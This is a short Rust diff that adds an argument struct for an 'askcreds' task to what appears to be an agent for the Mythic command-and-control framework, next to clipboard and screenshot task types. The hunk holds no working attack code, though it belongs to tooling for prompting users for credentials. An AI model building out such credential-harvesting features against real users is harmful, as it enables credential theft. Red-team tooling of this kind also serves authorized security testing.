@@ -46,6 +46,12 @@ pub struct ClipboardArgs {}
 #[derive(Debug, Deserialize)]
 pub struct ScreenshotArgs {}
 
+/// Struct containing the askcreds args from Mythic
+#[derive(Debug, Deserialize)]
+pub struct AskCredsArgs {
+    pub reason: Option<String>,
+}
+
 /// Response from Mythic on "get_tasking"
 #[derive(Debug, Deserialize, Serialize)]
 pub struct GetTaskingResponse {
